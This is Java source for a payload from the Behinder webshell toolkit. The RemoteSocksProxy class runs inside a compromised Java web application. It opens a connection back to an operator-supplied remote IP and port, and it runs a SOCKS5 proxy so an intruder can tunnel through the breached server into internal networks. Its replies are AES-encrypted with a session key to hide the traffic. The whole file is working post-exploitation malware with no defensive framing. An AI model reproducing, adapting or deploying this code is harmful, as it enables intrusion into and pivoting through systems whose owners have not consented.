package net.rebeyond.behinder.payload.java;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;

public class RemoteSocksProxy implements Runnable {
   public static String action;
   public static String remoteIP;
   public static String remotePort;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;
   private int listenPort = 5555;
   private String threadType;
   private Map paramMap;

   public RemoteSocksProxy(String threadType, Map paramMap) {
      this.threadType = threadType;
      this.paramMap = paramMap;
   }

   public RemoteSocksProxy() {
   }

   public boolean equals(Object obj) {
      try {
         this.fillContext(obj);
      } catch (Exception var29) {
         return true;
      }

      HashMap result = new HashMap();
      boolean var21 = false;

      ServletOutputStream so = null;
      label167: {
         try {
            var21 = true;
            Map paramMap = new HashMap();
            paramMap.put("remoteIP", remoteIP);
            paramMap.put("remotePort", remotePort);
            paramMap.put("request", this.Request);
            paramMap.put("response", this.Response);
            paramMap.put("session", this.Session);
            String socksServerHash = "socks_server_" + this.listenPort;
            paramMap.put("serverSocketHash", socksServerHash);
            if (action.equals("create")) {
               try {
                  ServerSocket serverSocket = new ServerSocket(0, 50);
                  this.listenPort = serverSocket.getLocalPort();
                  paramMap.put("listenPort", this.listenPort);
                  System.out.println("listenPort:" + this.listenPort);
                  this.Session.setAttribute(socksServerHash, serverSocket);
                  serverSocket.setReuseAddress(true);
                  (new Thread(new RemoteSocksProxy("daemon", paramMap))).start();
                  Thread.sleep(500L);
                  (new Thread(new RemoteSocksProxy("link", paramMap))).start();
                  result.put("status", "success");
                  result.put("msg", "success");
                  var21 = false;
               } catch (Exception var28) {
                  result.put("status", "fail");
                  result.put("msg", var28.getMessage());
                  var28.printStackTrace();
                  var21 = false;
               }
            } else if (!action.equals("stop")) {
               var21 = false;
            } else {
               Enumeration keys = this.Session.getAttributeNames();

               while(keys.hasMoreElements()) {
                  String key = keys.nextElement().toString();
                  if (key.startsWith("socks_")) {
                     Object socket = this.Session.getAttribute(key);
                     this.Session.removeAttribute(key);
                     if (socket.getClass().getName().indexOf("SocketChannel") >= 0) {
                        try {
                           ((SocketChannel)socket).close();
                        } catch (IOException var27) {
                        }
                     } else if (socket.getClass().getName().indexOf("ServerSocket") >= 0) {
                        try {
                           ((ServerSocket)socket).close();
                        } catch (IOException var26) {
                        }
                     } else {
                        try {
                           ((Socket)socket).close();
                        } catch (IOException var25) {
                        }
                     }
                  }
               }

               result.put("status", "success");
               result.put("msg", "success");
               var21 = false;
            }
            break label167;
         } catch (Exception var30) {
            result.put("status", "fail");
            result.put("msg", var30.getMessage());
            var21 = false;
         } finally {
            if (var21) {
               try {
                  so = this.Response.getOutputStream();
                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.flush();
                  so.close();
               } catch (Exception var22) {
                  var22.printStackTrace();
               }

            }
         }

         try {
            so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
         } catch (Exception var23) {
            var23.printStackTrace();
         }

         return true;
      }

      try {
         so = this.Response.getOutputStream();
         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.flush();
         so.close();
      } catch (Exception var24) {
         var24.printStackTrace();
      }

      return true;
   }

   public void run() {
      HttpSession session;
      Socket targetSocket;
      if (this.threadType.equals("daemon")) {
         session = (HttpSession)this.paramMap.get("session");
         ServerSocket serverSocket = (ServerSocket)session.getAttribute(this.paramMap.get("serverSocketHash").toString());

         while(true) {
            try {
               targetSocket = serverSocket.accept();
               String serverInnersocketHash = "socks_server_inner_" + targetSocket.getInetAddress().getHostAddress() + "_" + targetSocket.getPort();
               this.paramMap.put("serverInnersocketHash", serverInnersocketHash);
               session.setAttribute(serverInnersocketHash, targetSocket);
               (new Thread(new RemoteSocksProxy("session", this.paramMap))).start();
            } catch (Exception var17) {
               break;
            }
         }
      } else {
         SocketChannel remoteSocketChannel;
         if (this.threadType.equals("link")) {
            try {
               session = (HttpSession)this.paramMap.get("session");
               String remoteIP = this.paramMap.get("remoteIP").toString();
               int remotePort = Integer.parseInt(this.paramMap.get("remotePort").toString());
               int listenPort = Integer.parseInt(this.paramMap.get("listenPort").toString());
               System.out.println("remoate port:" + remoteIP + "," + remotePort);
               remoteSocketChannel = SocketChannel.open();
               remoteSocketChannel.connect(new InetSocketAddress(remoteIP, remotePort));
               String outerSocketChannelHash = "socks_outer_" + remoteSocketChannel.socket().getLocalPort() + "_" + remoteIP + "_" + remotePort;
               session.setAttribute(outerSocketChannelHash, remoteSocketChannel);
               this.paramMap.put("outerSocketChannelHash", outerSocketChannelHash);
               SocketChannel innerSocketChannel = SocketChannel.open();
               innerSocketChannel.connect(new InetSocketAddress("127.0.0.1", listenPort));
               String innerSocketChannelHash = "socks_inner_" + innerSocketChannel.socket().getLocalPort();
               session.setAttribute(innerSocketChannelHash, innerSocketChannel);
               this.paramMap.put("innerSocketChannelHash", innerSocketChannelHash);
               (new Thread(new RemoteSocksProxy("linkRead", this.paramMap))).start();
               (new Thread(new RemoteSocksProxy("linkWrite", this.paramMap))).start();
            } catch (IOException var12) {
               var12.printStackTrace();
            }
         } else {
            SocketChannel outerSocketChannel;
            SocketChannel innerSocketChannel;
            ByteBuffer buf = null;
            int bytesRead = 0;
            OutputStream so;
            if (this.threadType.equals("linkRead")) {
               session = (HttpSession)this.paramMap.get("session");
               outerSocketChannel = (SocketChannel)session.getAttribute(this.paramMap.get("outerSocketChannelHash").toString());
               innerSocketChannel = (SocketChannel)session.getAttribute(this.paramMap.get("innerSocketChannelHash").toString());
               System.out.println("start linkRead.." + outerSocketChannel + innerSocketChannel);

               while(true) {
                  while(true) {
                     try {
                        SocketChannel localSocketChannel = innerSocketChannel;
                        buf = ByteBuffer.allocate(512);
                        bytesRead = innerSocketChannel.read(buf);

                        for(so = outerSocketChannel.socket().getOutputStream(); bytesRead > 0; bytesRead = localSocketChannel.read(buf)) {
                           so.write(buf.array(), 0, bytesRead);
                           so.flush();
                           buf.clear();
                        }

                        so.flush();
                        so.close();
                     } catch (IOException var13) {
                     }
                  }
               }
            }

            if (this.threadType.equals("linkWrite")) {
               session = (HttpSession)this.paramMap.get("session");
               outerSocketChannel = (SocketChannel)session.getAttribute(this.paramMap.get("outerSocketChannelHash").toString());
               innerSocketChannel = (SocketChannel)session.getAttribute(this.paramMap.get("innerSocketChannelHash").toString());
               System.out.println("start linkWrite.." + outerSocketChannel + innerSocketChannel);

               while(true) {
                  while(true) {
                     try {
                        remoteSocketChannel = outerSocketChannel;
                        buf = ByteBuffer.allocate(512);
                        bytesRead = outerSocketChannel.read(buf);

                        for(so = innerSocketChannel.socket().getOutputStream(); bytesRead > 0; bytesRead = remoteSocketChannel.read(buf)) {
                           so.write(buf.array(), 0, bytesRead);
                           so.flush();
                           buf.clear();
                        }

                        so.flush();
                        so.close();
                     } catch (IOException var14) {
                     }
                  }
               }
            }

            Socket serverInnersocket;
            if (this.threadType.equals("session")) {
               session = (HttpSession)this.paramMap.get("session");
               serverInnersocket = (Socket)session.getAttribute(this.paramMap.get("serverInnersocketHash").toString());
               System.out.println("init session...." + serverInnersocket);

               try {
                  if (this.handleSocks(serverInnersocket)) {
                     Thread writer = new Thread(new RemoteSocksProxy("sessionWrite", this.paramMap));
                     writer.start();
                     Thread reader = new Thread(new RemoteSocksProxy("sessionRead", this.paramMap));
                     reader.start();
                     (new Thread(new RemoteSocksProxy("link", this.paramMap))).start();
                  }
               } catch (Exception var11) {
                  var11.printStackTrace();
               }
            } else {
               if (this.threadType.equals("sessionRead")) {
                  session = (HttpSession)this.paramMap.get("session");
                  serverInnersocket = (Socket)session.getAttribute(this.paramMap.get("serverInnersocketHash").toString());
                  targetSocket = (Socket)session.getAttribute(this.paramMap.get("targetSocketHash").toString());
                  System.out.println("start sessionRead" + targetSocket + "," + this.paramMap.get("targetSocketHash").toString());
                  if (serverInnersocket != null) {
                     try {
                        System.out.println("to sessionRead 111");
                        byte[] bufs = new byte[512];
                        bytesRead = targetSocket.getInputStream().read(bufs);
                        System.out.println("to sessionRead " + new String(bufs));

                        while(bytesRead > 0) {
                           serverInnersocket.getOutputStream().write(bufs, 0, bytesRead);
                           serverInnersocket.getOutputStream().flush();
                           bytesRead = targetSocket.getInputStream().read(bufs);
                        }
                     } catch (Exception var15) {
                        var15.printStackTrace();
                     }

                     try {
                        serverInnersocket.close();
                        targetSocket.close();
                     } catch (Exception var10) {
                        var10.printStackTrace();
                     }
                  }
               } else if (this.threadType.equals("sessionWrite")) {
                  session = (HttpSession)this.paramMap.get("session");
                  serverInnersocket = (Socket)session.getAttribute(this.paramMap.get("serverInnersocketHash").toString());
                  targetSocket = (Socket)session.getAttribute(this.paramMap.get("targetSocketHash").toString());
                  System.out.println("start sessionWrite" + targetSocket + "," + this.paramMap.get("targetSocketHash").toString());
                  if (serverInnersocket != null) {
                     try {
                        byte[] bufs = new byte[512];
                        bytesRead = serverInnersocket.getInputStream().read(bufs);
                        System.out.println("to sessionWrite size:" + bytesRead + "raw:" + new String(bufs));

                        while(bytesRead > 0) {
                           System.out.println("write >0 ...." + targetSocket);
                           targetSocket.getOutputStream().write(bufs, 0, bytesRead);
                           System.out.println("write >1 ....");
                           targetSocket.getOutputStream().flush();
                           System.out.println("write >2 ....");
                           bytesRead = serverInnersocket.getInputStream().read(bufs);
                        }
                     } catch (Exception var16) {
                        var16.printStackTrace();
                     }

                     try {
                        serverInnersocket.close();
                        targetSocket.close();
                     } catch (Exception var9) {
                        var9.printStackTrace();
                     }
                  }
               }
            }
         }
      }

   }

   private boolean handleSocks(Socket socket) throws Exception {
      int ver = socket.getInputStream().read();
      if (ver == 5) {
         return this.parseSocks5(socket);
      } else {
         return ver == 4 ? this.parseSocks4(socket) : false;
      }
   }

   private boolean parseSocks5(Socket socket) throws Exception {
      System.out.println("i am in parseSocks5......");
      DataInputStream ins = new DataInputStream(socket.getInputStream());
      DataOutputStream os = new DataOutputStream(socket.getOutputStream());
      int nmethods = ins.read();

      for(int i = 0; i < nmethods; ++i) {
         int var10 = ins.read();
      }

      os.write(new byte[]{5, 0});
      int version = ins.read();
      int cmd;
      int rsv;
      int atyp;
      if (version == 2) {
         version = ins.read();
         cmd = ins.read();
         rsv = ins.read();
         atyp = ins.read();
      } else {
         cmd = ins.read();
         rsv = ins.read();
         atyp = ins.read();
      }

      byte[] targetPort = new byte[2];
      String host = "";
      byte[] target;
      if (atyp == 1) {
         target = new byte[4];
         ins.readFully(target);
         ins.readFully(targetPort);
         String[] tempArray = new String[4];

         int temp;
         for(int i = 0; i < target.length; ++i) {
            temp = target[i] & 255;
            tempArray[i] = temp + "";
         }

         String[] var23 = tempArray;
         temp = tempArray.length;

         for(int var16 = 0; var16 < temp; ++var16) {
            String tempstr = var23[var16];
            host = host + tempstr + ".";
         }

         host = host.substring(0, host.length() - 1);
      } else if (atyp == 3) {
         int targetLen = ins.read();
         target = new byte[targetLen];
         ins.readFully(target);
         ins.readFully(targetPort);
         host = new String(target);
      } else if (atyp == 4) {
         target = new byte[16];
         ins.readFully(target);
         ins.readFully(targetPort);
         host = new String(target);
      }

      int port = (targetPort[0] & 255) * 256 + (targetPort[1] & 255);
      if (cmd != 2 && cmd != 3) {
         if (cmd == 1) {
            host = InetAddress.getByName(host).getHostAddress();

            try {
               System.out.println("connect target " + host + ":" + port);
               Socket targetSocket = new Socket(host, port);
               System.out.println("new targetsocket:" + targetSocket);
               String targetSocketHash = "socks_target_" + targetSocket.getLocalPort() + "_" + host + "_" + port;
               this.paramMap.put("targetSocketHash", targetSocketHash);
               ((HttpSession)this.paramMap.get("session")).setAttribute(targetSocketHash, targetSocket);
               os.write(mergeByteArray(new byte[]{5, 0, 0, 1}, InetAddress.getByName(host).getAddress(), targetPort));
               return true;
            } catch (Exception var18) {
               os.write(mergeByteArray(new byte[]{5, 5, 0, 1}, InetAddress.getByName(host).getAddress(), targetPort));
               throw new Exception(String.format("[%s:%d] Remote failed", host, port));
            }
         } else {
            throw new Exception("Socks5 - Unknown CMD");
         }
      } else {
         throw new Exception("not implemented");
      }
   }

   private boolean parseSocks4(Socket socket) {
      return false;
   }

   public static byte[] mergeByteArray(byte[]... byteArray) {
      int totalLength = 0;

      for(int i = 0; i < byteArray.length; ++i) {
         if (byteArray[i] != null) {
            totalLength += byteArray[i].length;
         }
      }

      byte[] result = new byte[totalLength];
      int cur = 0;

      for(int i = 0; i < byteArray.length; ++i) {
         if (byteArray[i] != null) {
            System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
            cur += byteArray[i].length;
         }
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
         System.out.println("request:" + this.Request);
      } else {
         Map objMap = (Map)obj;
         this.Session = (HttpSession)objMap.get("session");
         this.Response = (ServletResponse)objMap.get("response");
         this.Request = (ServletRequest)objMap.get("request");
      }

      this.Response.setCharacterEncoding("UTF-8");
   }

   private static String base64encode(String content) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
      } else {
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            value = base64encode(value);
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getAttribute("u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }
}
